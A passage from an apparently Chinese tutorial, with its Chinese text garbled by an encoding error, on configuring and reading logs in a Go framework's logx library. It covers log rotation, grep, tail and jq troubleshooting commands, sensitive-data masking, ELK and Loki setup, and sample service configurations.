<table><thead><tr><th>æ—¥å¿—ç±»å‹</th><th>æ–‡ä»¶å</th><th>è§¦å‘æ¡ä»¶</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>access.log</td><td>è®¿é—®æ—¥å¿—</td><td>Infoã€Infofã€Infow</td><td>è®°å½•æ­£å¸¸ä¸šåŠ¡æµç¨‹</td></tr><tr><td>error.log</td><td>é”™è¯¯æ—¥å¿—</td><td>Errorã€Errorfã€Errorw</td><td>è®°å½•ä¸šåŠ¡é”™è¯¯</td></tr><tr><td>severe.log</td><td>ä¸¥é‡é”™è¯¯</td><td>Severeã€Severefã€Severew</td><td>è®°å½•ç³»ç»Ÿçº§ä¸¥é‡é”™è¯¯</td></tr><tr><td>slow.log</td><td>æ…¢æ—¥å¿—</td><td>Slowã€Slowfã€Sloww</td><td>è®°å½•è€—æ—¶æ“ä½œ</td></tr><tr><td>stat.log</td><td>ç»Ÿè®¡æ—¥å¿—</td><td>Statã€Statfã€Statw</td><td>è®°å½•ç»Ÿè®¡ä¿¡æ¯</td></tr></tbody></table>
<h3 data-id="heading-25">5.3 ä»€ä¹ˆæ—¶å€™ä¼šå­˜æ–‡ä»¶</h3>
<p><strong>å­˜æ–‡ä»¶æ¡ä»¶ï¼š</strong></p>
<ol>
<li><code>Log.Mode = "file"</code> æˆ– <code>"volume"</code></li>
<li>é…ç½®äº† <code>Log.Path</code></li>
</ol>
<p><strong>ä¸å­˜æ–‡ä»¶æ¡ä»¶ï¼š</strong></p>
<ol>
<li><code>Log.Mode = "console"</code> - åªè¾“å‡ºåˆ°æ§åˆ¶å°</li>
<li>ä¸é…ç½® Log - é»˜è®¤ console æ¨¡å¼</li>
</ol>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># âœ… ä¼šå­˜æ–‡ä»¶</span>
<span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">file</span>
  <span class="hljs-attr">Path:</span> <span class="hljs-string">logs</span>

<span class="hljs-comment"># âœ… ä¼šå­˜æ–‡ä»¶ï¼ˆå®¹å™¨ç¯å¢ƒï¼‰</span>
<span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">volume</span>
  <span class="hljs-attr">Path:</span> <span class="hljs-string">/var/log/app</span>

<span class="hljs-comment"># âŒ ä¸ä¼šå­˜æ–‡ä»¶</span>
<span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">console</span>

<span class="hljs-comment"># âŒ ä¸ä¼šå­˜æ–‡ä»¶ï¼ˆé»˜è®¤é…ç½®ï¼‰</span>
<span class="hljs-comment"># ä¸é…ç½® Log</span>
</code></pre>
<h3 data-id="heading-26">5.4 æ—¥å¿—è½®è½¬æœºåˆ¶</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Path:</span> <span class="hljs-string">logs</span>
  <span class="hljs-attr">MaxSize:</span> <span class="hljs-number">100</span>        <span class="hljs-comment"># å•æ–‡ä»¶ 100MB åè½®è½¬</span>
  <span class="hljs-attr">MaxBackups:</span> <span class="hljs-number">5</span>       <span class="hljs-comment"># æœ€å¤šä¿ç•™ 5 ä¸ªå¤‡ä»½</span>
  <span class="hljs-attr">MaxAge:</span> <span class="hljs-number">30</span>          <span class="hljs-comment"># ä¿ç•™ 30 å¤©</span>
  <span class="hljs-attr">KeepDays:</span> <span class="hljs-number">7</span>         <span class="hljs-comment"># ä¼˜å…ˆçº§æ›´é«˜ï¼Œä¿ç•™ 7 å¤©</span>
  <span class="hljs-attr">Compress:</span> <span class="hljs-literal">true</span>      <span class="hljs-comment"># å‹ç¼©æ—§æ–‡ä»¶ä¸º .gz</span>
</code></pre>
<p><strong>è½®è½¬è§¦å‘æ¡ä»¶ï¼ˆæ»¡è¶³ä»»ä¸€ï¼‰ï¼š</strong></p>
<ul>
<li>æ–‡ä»¶å¤§å°è¶…è¿‡ MaxSize</li>
<li>æ–‡ä»¶åˆ›å»ºæ—¶é—´è¶…è¿‡ KeepDays</li>
<li>è¾¾åˆ°æ¯æ—¥åˆå¤œï¼ˆè‡ªåŠ¨è½®è½¬ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-27">å…­ã€æ—¥å¿—æŸ¥çœ‹ä¸é—®é¢˜æ’æŸ¥</h2>
<h3 data-id="heading-28">6.1 æŸ¥çœ‹æ—¥å¿—çš„æ–¹å¼</h3>
<h4 data-id="heading-29">æ–¹å¼ä¸€ï¼štail å®æ—¶æŸ¥çœ‹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®æ—¶æŸ¥çœ‹æ‰€æœ‰æ—¥å¿—</span>
<span class="hljs-built_in">tail</span> -f logs/access.log

<span class="hljs-comment"># å®æ—¶æŸ¥çœ‹é”™è¯¯æ—¥å¿—</span>
<span class="hljs-built_in">tail</span> -f logs/error.log

<span class="hljs-comment"># åŒæ—¶æŸ¥çœ‹å¤šä¸ªæ—¥å¿—</span>
<span class="hljs-built_in">tail</span> -f logs/access.log logs/error.log
</code></pre>
<h4 data-id="heading-30">æ–¹å¼äºŒï¼šgrep è¿‡æ»¤æŸ¥çœ‹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥æ‰¾ç‰¹å®šç”¨æˆ·çš„æ—¥å¿—</span>
grep <span class="hljs-string">"userId\":\"123"</span> logs/access.log

<span class="hljs-comment"># æŸ¥æ‰¾é”™è¯¯æ—¥å¿—</span>
grep <span class="hljs-string">"error"</span> logs/access.log

<span class="hljs-comment"># æŸ¥æ‰¾ç‰¹å®šæ—¶é—´æ®µçš„æ—¥å¿—</span>
grep <span class="hljs-string">"2025-12-29T10:"</span> logs/access.log

<span class="hljs-comment"># æŸ¥æ‰¾å¹¶æ˜¾ç¤ºä¸Šä¸‹æ–‡</span>
grep -C 5 <span class="hljs-string">"error"</span> logs/access.log  <span class="hljs-comment"># æ˜¾ç¤ºå‰å5è¡Œ</span>
</code></pre>
<h4 data-id="heading-31">æ–¹å¼ä¸‰ï¼šless åˆ†é¡µæŸ¥çœ‹</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ†é¡µæŸ¥çœ‹æ—¥å¿—</span>
less logs/access.log

<span class="hljs-comment"># åœ¨ less ä¸­æœç´¢ï¼šæŒ‰ / ç„¶åè¾“å…¥å…³é”®è¯</span>
<span class="hljs-comment"># ä¸‹ä¸€ä¸ªï¼šn</span>
<span class="hljs-comment"># ä¸Šä¸€ä¸ªï¼šN</span>
</code></pre>
<h4 data-id="heading-32">æ–¹å¼å››ï¼šcat é…åˆå·¥å…·</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æœ€è¿‘100è¡Œ</span>
<span class="hljs-built_in">tail</span> -n 100 logs/access.log

<span class="hljs-comment"># æŸ¥çœ‹å‰100è¡Œ</span>
<span class="hljs-built_in">head</span> -n 100 logs/access.log

<span class="hljs-comment"># JSONæ ¼å¼ç¾åŒ–</span>
<span class="hljs-built_in">cat</span> logs/access.log | jq <span class="hljs-string">'.'</span>
</code></pre>
<h3 data-id="heading-33">6.2 é€šè¿‡ trace_id è¿½è¸ªè¯·æ±‚é“¾è·¯</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æå– trace_id è¿½è¸ªæ•´ä¸ªè¯·æ±‚é“¾è·¯</span>
grep <span class="hljs-string">"trace:abc123"</span> logs/*.<span class="hljs-built_in">log</span>

<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹ï¼š</span>
<span class="hljs-comment"># logs/access.log:{"@timestamp":"...","trace":"abc123","content":"GET /api/users"}</span>
<span class="hljs-comment"># logs/access.log:{"@timestamp":"...","trace":"abc123","content":"query user from db"}</span>
<span class="hljs-comment"># logs/error.log:{"@timestamp":"...","trace":"abc123","content":"user not found"}</span>
</code></pre>
<h3 data-id="heading-34">6.3 æ€§èƒ½é—®é¢˜æ’æŸ¥</h3>
<h4 data-id="heading-35">æ…¢æŸ¥è¯¢æ’æŸ¥</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹æ…¢æ—¥å¿—</span>
<span class="hljs-built_in">cat</span> logs/slow.log

<span class="hljs-comment"># æŸ¥æ‰¾è¶…è¿‡1ç§’çš„æ“ä½œ</span>
grep <span class="hljs-string">"duration\":\"[0-9]\+s"</span> logs/slow.log

<span class="hljs-comment"># ç»Ÿè®¡æœ€æ…¢çš„10ä¸ªæ“ä½œ</span>
<span class="hljs-built_in">cat</span> logs/slow.log | jq <span class="hljs-string">'.duration'</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">tail</span> -10
</code></pre>
<h4 data-id="heading-36">é«˜é¢‘é”™è¯¯æ’æŸ¥</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç»Ÿè®¡é”™è¯¯ç±»å‹</span>
<span class="hljs-built_in">cat</span> logs/error.log | jq <span class="hljs-string">'.error'</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn

<span class="hljs-comment"># æŸ¥æ‰¾ç‰¹å®šé”™è¯¯</span>
grep <span class="hljs-string">"connection timeout"</span> logs/error.log
</code></pre>
<h3 data-id="heading-37">6.4 å…¸å‹é—®é¢˜æ’æŸ¥æµç¨‹</h3>
<h4 data-id="heading-38">é—®é¢˜1ï¼šæ¥å£å“åº”æ…¢</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æŸ¥çœ‹ slow.log</span>
<span class="hljs-built_in">tail</span> -f logs/slow.log

<span class="hljs-comment"># 2. æ‰¾åˆ°æ…¢è¯·æ±‚çš„ trace_id</span>
grep <span class="hljs-string">"duration\":\"[0-9]\+s"</span> logs/slow.log

<span class="hljs-comment"># 3. æ ¹æ® trace_id è¿½è¸ªå®Œæ•´é“¾è·¯</span>
grep <span class="hljs-string">"trace:abc123"</span> logs/*.<span class="hljs-built_in">log</span>

<span class="hljs-comment"># 4. åˆ†æç“¶é¢ˆï¼šæ•°æ®åº“ï¼Ÿå¤–éƒ¨APIï¼Ÿ</span>
</code></pre>
<h4 data-id="heading-39">é—®é¢˜2ï¼šæ¥å£è¿”å› 500 é”™è¯¯</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æŸ¥çœ‹ error.log</span>
<span class="hljs-built_in">tail</span> -f logs/error.log

<span class="hljs-comment"># 2. æ‰¾åˆ°é”™è¯¯ä¿¡æ¯å’Œå †æ ˆ</span>
grep -A 10 <span class="hljs-string">"500"</span> logs/error.log

<span class="hljs-comment"># 3. æ ¹æ®æ—¶é—´å’Œè·¯å¾„å®šä½ä»£ç </span>
<span class="hljs-comment"># 4. æŸ¥çœ‹ç›¸å…³ä¸šåŠ¡æ—¥å¿—</span>
</code></pre>
<h4 data-id="heading-40">é—®é¢˜3ï¼šæ‰¾ä¸åˆ°æŸä¸ªè¯·æ±‚çš„æ—¥å¿—</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯èƒ½åŸå› ï¼š</span>
<span class="hljs-comment"># 1. æ—¥å¿—çº§åˆ«å¤ªé«˜ï¼ˆè®¾ç½®ä¸º errorï¼Œä½†è¯·æ±‚æ˜¯ infoï¼‰</span>
<span class="hljs-comment"># 2. æ—¥å¿—å·²è¢«è½®è½¬æˆ–åˆ é™¤</span>
<span class="hljs-comment"># 3. æ—¶é—´ä¸å¯¹ï¼ˆæ³¨æ„æ—¶åŒºï¼‰</span>

<span class="hljs-comment"># è§£å†³ï¼š</span>
<span class="hljs-comment"># 1. æ£€æŸ¥ Log.Level é…ç½®</span>
<span class="hljs-comment"># 2. æŸ¥çœ‹å½’æ¡£æ—¥å¿— access.log.2025122901</span>
<span class="hljs-comment"># 3. æ£€æŸ¥æœåŠ¡å™¨æ—¶åŒºè®¾ç½®</span>
</code></pre>
<hr/>
<h2 data-id="heading-41">ä¸ƒã€æ—¥å¿—ä½¿ç”¨å»ºè®®</h2>
<h3 data-id="heading-42">7.1 ä»€ä¹ˆæ—¶å€™å¼€å¯æ—¥å¿—</h3>








































<table><thead><tr><th>åœºæ™¯</th><th>æ˜¯å¦å¼€å¯</th><th>å»ºè®®é…ç½®</th></tr></thead><tbody><tr><td>å¼€å‘ç¯å¢ƒ</td><td>âœ… å¿…é¡»</td><td>Mode: console, Level: debug</td></tr><tr><td>æµ‹è¯•ç¯å¢ƒ</td><td>âœ… å¿…é¡»</td><td>Mode: file, Level: info</td></tr><tr><td>é¢„å‘ç¯å¢ƒ</td><td>âœ… å¿…é¡»</td><td>Mode: file, Level: info</td></tr><tr><td>ç”Ÿäº§ç¯å¢ƒ</td><td>âœ… å¿…é¡»</td><td>Mode: file, Level: info/error</td></tr><tr><td>æ€§èƒ½æµ‹è¯•</td><td>âš ï¸ å¯é€‰</td><td>Mode: file, Level: errorï¼ˆå‡å°‘IOï¼‰</td></tr><tr><td>å‹åŠ›æµ‹è¯•</td><td>âš ï¸ å¯é€‰</td><td>Level: errorï¼ˆå‡å°‘æ—¥å¿—é‡ï¼‰</td></tr></tbody></table>
<p><strong>ç»“è®ºï¼šå»ºè®®ä¸€ç›´å¼€å¯æ—¥å¿—ï¼Œæ ¹æ®ç¯å¢ƒè°ƒæ•´çº§åˆ«å’Œè¾“å‡ºæ–¹å¼ã€‚</strong></p>
<h3 data-id="heading-43">7.2 æ—¥å¿—çº§åˆ«é€‰æ‹©</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// debug - å¼€å‘è°ƒè¯•ï¼ˆç”Ÿäº§ä¸å»ºè®®ï¼‰</span>
logx.Debug(<span class="hljs-string">"è°ƒè¯•ä¿¡æ¯ï¼šå˜é‡å€¼ä¸º xxx"</span>)

<span class="hljs-comment">// info - æ­£å¸¸ä¸šåŠ¡æµç¨‹ï¼ˆæ¨èï¼‰</span>
logx.Info(<span class="hljs-string">"ç”¨æˆ·ç™»å½•æˆåŠŸ"</span>)

<span class="hljs-comment">// error - ä¸šåŠ¡é”™è¯¯ï¼ˆå¿…é¡»ï¼‰</span>
logx.Error(<span class="hljs-string">"è·å–ç”¨æˆ·ä¿¡æ¯å¤±è´¥"</span>)

<span class="hljs-comment">// severe - ä¸¥é‡ç³»ç»Ÿé”™è¯¯ï¼ˆå¿…é¡»ï¼‰</span>
logx.Severe(<span class="hljs-string">"æ•°æ®åº“è¿æ¥å¤±è´¥"</span>)
</code></pre>
<h3 data-id="heading-44">7.3 æ—¥å¿—æ€§èƒ½ä¼˜åŒ–</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// âŒ ä¸æ¨èï¼šé«˜é¢‘æ—¥å¿—</span>
<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++ {
    logx.Info(<span class="hljs-string">"å¤„ç†ä¸­ï¼š"</span>, i)  <span class="hljs-comment">// ä¼šäº§ç”Ÿå¤§é‡æ—¥å¿—</span>
}

<span class="hljs-comment">// âœ… æ¨èï¼šæ‰¹é‡è®°å½•</span>
logx.Infof(<span class="hljs-string">"æ‰¹é‡å¤„ç†å®Œæˆï¼Œå…±å¤„ç† %d æ¡"</span>, <span class="hljs-number">10000</span>)

<span class="hljs-comment">// âŒ ä¸æ¨èï¼šå¤æ‚å¯¹è±¡åºåˆ—åŒ–</span>
logx.Infow(<span class="hljs-string">"ç”¨æˆ·ä¿¡æ¯"</span>, logx.Field(<span class="hljs-string">"user"</span>, largeUserObject))

<span class="hljs-comment">// âœ… æ¨èï¼šåªè®°å½•å…³é”®å­—æ®µ</span>
logx.Infow(<span class="hljs-string">"ç”¨æˆ·ä¿¡æ¯"</span>, 
    logx.Field(<span class="hljs-string">"userId"</span>, user.Id),
    logx.Field(<span class="hljs-string">"userName"</span>, user.Name))
</code></pre>
<h3 data-id="heading-45">7.4 æ•æ„Ÿä¿¡æ¯å¤„ç†</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// âŒ å±é™©ï¼šè®°å½•æ•æ„Ÿä¿¡æ¯</span>
logx.Infow(<span class="hljs-string">"ç”¨æˆ·ç™»å½•"</span>, 
    logx.Field(<span class="hljs-string">"password"</span>, password))  <span class="hljs-comment">// ä¸è¦è®°å½•å¯†ç </span>
logx.Infow(<span class="hljs-string">"æ”¯ä»˜"</span>, 
    logx.Field(<span class="hljs-string">"cardNo"</span>, cardNo))      <span class="hljs-comment">// ä¸è¦è®°å½•å®Œæ•´å¡å·</span>

<span class="hljs-comment">// âœ… å®‰å…¨ï¼šè„±æ•å¤„ç†</span>
logx.Infow(<span class="hljs-string">"ç”¨æˆ·ç™»å½•"</span>, 
    logx.Field(<span class="hljs-string">"userId"</span>, userId))
logx.Infow(<span class="hljs-string">"æ”¯ä»˜"</span>, 
    logx.Field(<span class="hljs-string">"cardNo"</span>, maskCard(cardNo)))  <span class="hljs-comment">// å¦‚ï¼š**** **** **** 1234</span>
</code></pre>
<hr/>
<h2 data-id="heading-46">å…«ã€å¸¸ç”¨æ—¥å¿—å·¥å…·</h2>
<h3 data-id="heading-47">8.1 æ—¥å¿—åˆ†æå·¥å…·</h3>
<h4 data-id="heading-48">ELK Stackï¼ˆæ¨èç”Ÿäº§ç¯å¢ƒï¼‰</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Filebeat é…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">filebeat.inputs:</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">log</span>
  <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">paths:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">/var/log/app/*.log</span>
  <span class="hljs-attr">json.keys_under_root:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">json.add_error_key:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">output.elasticsearch:</span>
  <span class="hljs-attr">hosts:</span> [<span class="hljs-string">"localhost:9200"</span>]
</code></pre>
<h4 data-id="heading-49">Lokiï¼ˆè½»é‡çº§æ¨èï¼‰</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># Promtail é…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">clients:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">http://loki:3100/loki/api/v1/push</span>

<span class="hljs-attr">scrape_configs:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">job_name:</span> <span class="hljs-string">app</span>
    <span class="hljs-attr">static_configs:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">targets:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">localhost</span>
        <span class="hljs-attr">labels:</span>
          <span class="hljs-attr">__path__:</span> <span class="hljs-string">/var/log/app/*.log</span>
</code></pre>
<h3 data-id="heading-50">8.2 æ—¥å¿—æŸ¥çœ‹å‘½ä»¤é€ŸæŸ¥</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®æ—¶æŸ¥çœ‹</span>
<span class="hljs-built_in">tail</span> -f logs/access.log

<span class="hljs-comment"># æŸ¥çœ‹æœ€è¿‘100è¡Œ</span>
<span class="hljs-built_in">tail</span> -n 100 logs/access.log

<span class="hljs-comment"># æœç´¢å…³é”®è¯</span>
grep <span class="hljs-string">"error"</span> logs/*.<span class="hljs-built_in">log</span>

<span class="hljs-comment"># æœç´¢å¹¶é«˜äº®æ˜¾ç¤º</span>
grep --color <span class="hljs-string">"error"</span> logs/access.log

<span class="hljs-comment"># ç»Ÿè®¡æ—¥å¿—è¡Œæ•°</span>
<span class="hljs-built_in">wc</span> -l logs/access.log

<span class="hljs-comment"># æŒ‰æ—¶é—´èŒƒå›´ç­›é€‰</span>
sed -n <span class="hljs-string">'/2025-12-29 10:00/,/2025-12-29 11:00/p'</span> logs/access.log

<span class="hljs-comment"># JSON æ—¥å¿—ç¾åŒ–</span>
<span class="hljs-built_in">cat</span> logs/access.log | jq <span class="hljs-string">'.'</span>

<span class="hljs-comment"># ç»Ÿè®¡é”™è¯¯ç±»å‹</span>
<span class="hljs-built_in">cat</span> logs/error.log | jq <span class="hljs-string">'.error'</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c

<span class="hljs-comment"># æ‰¾å‡ºæœ€æ…¢çš„10ä¸ªè¯·æ±‚</span>
<span class="hljs-built_in">cat</span> logs/slow.log | jq <span class="hljs-string">'.duration'</span> | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-built_in">head</span> -10
</code></pre>
<hr/>
<h2 data-id="heading-51">ä¹ã€å®Œæ•´é…ç½®ç¤ºä¾‹</h2>
<h3 data-id="heading-52">9.1 API æœåŠ¡é…ç½®</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># api/etc/user.yaml</span>
<span class="hljs-attr">Name:</span> <span class="hljs-string">user-api</span>
<span class="hljs-attr">Host:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
<span class="hljs-attr">Port:</span> <span class="hljs-number">8888</span>

<span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒæ—¥å¿—é…ç½®</span>
<span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">file</span>
  <span class="hljs-attr">Level:</span> <span class="hljs-string">info</span>
  <span class="hljs-attr">Encoding:</span> <span class="hljs-string">json</span>
  <span class="hljs-attr">Path:</span> <span class="hljs-string">logs</span>
  <span class="hljs-attr">MaxSize:</span> <span class="hljs-number">500</span>
  <span class="hljs-attr">MaxBackups:</span> <span class="hljs-number">10</span>
  <span class="hljs-attr">MaxAge:</span> <span class="hljs-number">30</span>
  <span class="hljs-attr">Compress:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">KeepDays:</span> <span class="hljs-number">30</span>
  <span class="hljs-attr">StackCooldownMillis:</span> <span class="hljs-number">100</span>

<span class="hljs-comment"># Telemetry é…ç½®ï¼ˆé“¾è·¯è¿½è¸ªï¼‰</span>
<span class="hljs-attr">Telemetry:</span>
  <span class="hljs-attr">Name:</span> <span class="hljs-string">user-api</span>
  <span class="hljs-attr">Endpoint:</span> <span class="hljs-string">http://jaeger:14268/api/traces</span>
  <span class="hljs-attr">Sampler:</span> <span class="hljs-number">1.0</span>
  <span class="hljs-attr">Batcher:</span> <span class="hljs-string">jaeger</span>
</code></pre>
<h3 data-id="heading-53">9.2 RPC æœåŠ¡é…ç½®</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># rpc/etc/user.yaml</span>
<span class="hljs-attr">Name:</span> <span class="hljs-string">user-rpc</span>
<span class="hljs-attr">ListenOn:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:8080</span>

<span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">file</span>
  <span class="hljs-attr">Level:</span> <span class="hljs-string">info</span>
  <span class="hljs-attr">Encoding:</span> <span class="hljs-string">json</span>
  <span class="hljs-attr">Path:</span> <span class="hljs-string">logs</span>
  <span class="hljs-attr">KeepDays:</span> <span class="hljs-number">30</span>

<span class="hljs-comment"># RPC è¶…æ—¶é…ç½®</span>
<span class="hljs-attr">Timeout:</span> <span class="hljs-number">30000</span>  <span class="hljs-comment"># 30ç§’</span>

<span class="hljs-comment"># RPC æ—¥å¿—é…ç½®</span>
<span class="hljs-attr">RpcLog:</span>
  <span class="hljs-attr">Stat:</span> <span class="hljs-literal">true</span>       <span class="hljs-comment"># å¼€å¯ç»Ÿè®¡æ—¥å¿—</span>
  <span class="hljs-attr">Slow:</span> <span class="hljs-literal">true</span>       <span class="hljs-comment"># å¼€å¯æ…¢æ—¥å¿—</span>
</code></pre>
<h3 data-id="heading-54">9.3 Docker ç¯å¢ƒé…ç½®</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># docker-compose.yaml ä¸­çš„æ—¥å¿—é…ç½®</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">user-api:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">user-api:latest</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./logs:/app/logs</span>  <span class="hljs-comment"># æŒ‚è½½æ—¥å¿—ç›®å½•</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">LOG_MODE=file</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">LOG_LEVEL=info</span>
</code></pre>
<hr/>
<h2 data-id="heading-55">åã€æ€»ç»“ä¸æ£€æŸ¥æ¸…å•</h2>
<h3 data-id="heading-56">âœ… æ—¥å¿—é…ç½®æ£€æŸ¥æ¸…å•</h3>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦é…ç½®äº† Log.Modeï¼ˆå¼€å‘ç”¨consoleï¼Œç”Ÿäº§ç”¨fileï¼‰</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦é…ç½®äº†åˆé€‚çš„ Log.Levelï¼ˆå¼€å‘ç”¨debugï¼Œç”Ÿäº§ç”¨infoï¼‰</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦é…ç½®äº† Log.Pathï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦é…ç½®äº†æ—¥å¿—è½®è½¬ï¼ˆMaxSizeã€MaxBackupsã€KeepDaysï¼‰</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦å¼€å¯äº†æ—¥å¿—å‹ç¼©ï¼ˆCompress: trueï¼‰</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦é…ç½®äº†é“¾è·¯è¿½è¸ªï¼ˆTelemetryï¼‰</li>
</ul>
<h3 data-id="heading-57">âœ… æ—¥å¿—ä½¿ç”¨æ£€æŸ¥æ¸…å•</h3>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å…³é”®ä¸šåŠ¡æ“ä½œæ˜¯å¦æœ‰æ—¥å¿—è®°å½•</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> é”™è¯¯å¤„ç†æ˜¯å¦è®°å½•äº†è¯¦ç»†é”™è¯¯ä¿¡æ¯</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ—¥å¿—æ˜¯å¦ä½¿ç”¨äº† WithContext ä»¥ä¾¿é“¾è·¯è¿½è¸ª</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ—¥å¿—æ˜¯å¦åŒ…å«äº†è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ä¿¡æ¯</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦é¿å…äº†è®°å½•æ•æ„Ÿä¿¡æ¯</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> é«˜é¢‘æ“ä½œæ˜¯å¦æ§åˆ¶äº†æ—¥å¿—æ•°é‡</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦ä½¿ç”¨äº†ç»“æ„åŒ–æ—¥å¿—ï¼ˆInfowã€Errorwï¼‰</li>
</ul>
<h3 data-id="heading-58">âœ… é—®é¢˜æ’æŸ¥æ£€æŸ¥æ¸…å•</h3>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦èƒ½é€šè¿‡ trace_id è¿½è¸ªå®Œæ•´è¯·æ±‚é“¾è·¯</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦èƒ½å¿«é€Ÿå®šä½é”™è¯¯æ—¥å¿—</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦èƒ½åˆ†ææ…¢æŸ¥è¯¢å’Œæ€§èƒ½ç“¶é¢ˆ</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦é…ç½®äº†æ—¥å¿—æ”¶é›†ç³»ç»Ÿï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦å®šæœŸæ¸…ç†æ—§æ—¥å¿—æ–‡ä»¶</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦æœ‰æ—¥å¿—ç›‘æ§å‘Šè­¦ï¼ˆä¸¥é‡é”™è¯¯ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-59">é™„å½•ï¼šå¸¸è§é—®é¢˜</h2>
<p><strong>Q1: æ—¥å¿—æ–‡ä»¶å¤ªå¤§æ€ä¹ˆåŠï¼Ÿ</strong></p>
<ul>
<li>è°ƒæ•´ MaxSize å’Œ KeepDays</li>
<li>æé«˜æ—¥å¿—çº§åˆ«ï¼ˆinfo -&gt; errorï¼‰</li>
<li>å‡å°‘ä¸å¿…è¦çš„æ—¥å¿—è¾“å‡º</li>
<li>å¼€å¯ Compress å‹ç¼©</li>
</ul>
<p><strong>Q2: æ‰¾ä¸åˆ°æŸä¸ªè¯·æ±‚çš„æ—¥å¿—ï¼Ÿ</strong></p>
<ul>
<li>æ£€æŸ¥æ—¥å¿—çº§åˆ«é…ç½®</li>
<li>ç¡®è®¤æ—¥å¿—æ˜¯å¦è¢«è½®è½¬</li>
